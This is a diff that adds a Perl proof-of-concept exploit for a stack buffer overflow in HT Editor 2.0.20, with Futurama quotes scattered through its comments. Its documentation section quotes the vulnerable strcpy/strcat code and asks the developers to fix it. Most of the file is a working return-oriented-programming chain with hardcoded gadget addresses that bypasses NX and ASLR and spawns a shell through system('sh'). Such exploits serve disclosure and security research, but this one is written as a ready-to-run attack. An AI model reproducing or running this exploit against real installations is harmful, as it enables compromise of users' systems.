@@ -1,0 +1,107 @@
+#!/usr/bin/perl
+=head1 TITLE
+
+HT Editor 2.0.20 Buffer Overflow (ROP PoC)
+
+=head2 DESCRIPTION
+
+Since version 2.0.18, the stack overflow vulnerability has not been corrected, which I assume would make it 0day?
+I consequently recoded an exploit, as memory addresses have changed. I chose to
+make it B<bypass NX & ASLR>, SSP not being implemented.
+To be honnest, it may be the only interest, as the binary is not SUID.
+
+Remove =begin ...  annotation (at the end) to just print the command line.
+
+=head2 USAGE
+
+perl poc.pl /hte/path
+
+
+
+=head3 Code
+
+	int sys_common_canonicalize(char *result, const char *filename, const char *cwd, is_path_delim delim)
+	{
+		char *o = result;
+		if (!sys_path_is_absolute(filename, delim)) {
+			if (cwd) strcpy(o, cwd); else return EINVAL; // Our buffer size depends on path length.
+			int ol = strlen(o);
+			if (ol && !delim(o[ol-1])) {
+				o[ol] = '/';
+				o[ol+1] = 0;
+			}
+		} else *o = 0;
+		strcat(o, filename); //<-- And here it is, good old unsecure function
+		int k = flatten_path(o, delim);
+		return (k == 0) ? 0 : EINVAL;
+	}
+
+=head3 AUTHORS
+
+ * ZadYree
+ * 3LRVS crew
+
+=head3 Note
+
+The path variable (o) is also vulnerable through a strcpy() unsecure call.
+Hope developpers will mind correcting both 2.
+
+
+Voice on T.V.: Is today's hectic lifestyle making you tense and impatient?
+Bender: Shut up and get to the point! 
+=cut
+
+use 5.010;
+use Cwd;
+
+my $bin = shift;
+die "[-] Bad filename.\n" unless (-e $bin);
+
+# Let's now dive into
+my $pool = [
+			## Fry: This snow is beautiful. I'm glad global warming never happened.    ##
+			## Leela: Actually, it did. But thank God nuclear winter canceled it out.  ##
+				pack('V', 0x80b395e), 		# pop %esi; ret;
+				pack('V', 0x81bd518), 		# endwin@GOT
+				pack('V', 0x80b5903), 		# mov %esi, %eax; pop pop pop ret;
+				pack('V', 0xb00b4dad) x 3, 	# JUNK
+				pack('V', 0x813527b), 		# mov (%eax), %eax; add $0x1c, %esp; ret;
+				pack('V', 0xabadf00d) x 7, 	# JUNK
+				pack('V', 0x813589b), 		# call *%eax;
+				
+			## 	Amy, technology isn't intrinsecly good or evil, it's how it's used, like the Death Ray. ##
+				pack('V', 0x80b395e), 		# pop %esi; ret;
+				pack('V', 0x81bd3fc), 		# __cxa_atexit@GOT - 4 // base address whose pointer will help locating system().
+				pack('V', 0x80b5903), 		# mov %esi, %eax; pop pop pop ret;
+				pack('V', 0xdeadbeef) x 3, 	# JUNK
+				pack('V', 0x80c21e6), 		# add %eax, $0x4; ret; // Beat my 8 bit metal ass.
+				pack('V', 0x813527b), 		# mov (%eax), %eax; add $0x1c, %esp; ret; // In the game of chess, you can never let your adversary see your pieces.
+				pack('V', 0xdeafface) x 7, 	# JUNK
+				pack('V', 0x80b395e), 		# pop %esi; ret;
+				pack('V', 0x292ceaab),	 	# A number to get the right 
+				pack('V', 0x80512a6), 		# add %esi, %eax; pop pop pop ret;
+				pack('V', 0xc0b4beef) x 3, 	# JUNK
+				pack('V', 0x80d4612), 		# sub eax, 0x292c4e8b ; ret; // I'm not sure. I'm afraid we need to use... MATH.
+				pack('V', 0x813589b), 		# call *%eax;
+				pack('V', 0x804aa10), 		# exit@plt
+				pack('V', 0x816928f), 		# 'sh' string
+];
+
+=begin printPayload
+my $buff = '"A"x' . (4107 - length(getcwd));
+
+my $rop = join("", map {$_ = '\x' . unpack('H*', $_)} split(//, join("", @$pool)));
+
+my $payload = qq{`perl -e 'print $buff . "$rop";'`};
+
+say $bin . ' ' . $payload;
+__END__
+=end printPayload
+=cut
+
+say "[*] Executing system('sh')";
+
+my $buff = ("A" x (4107 - length(getcwd)));
+my $rop = join("", @$pool);
+system($bin, $buff . $rop);
+say "[+] Got Shell!";
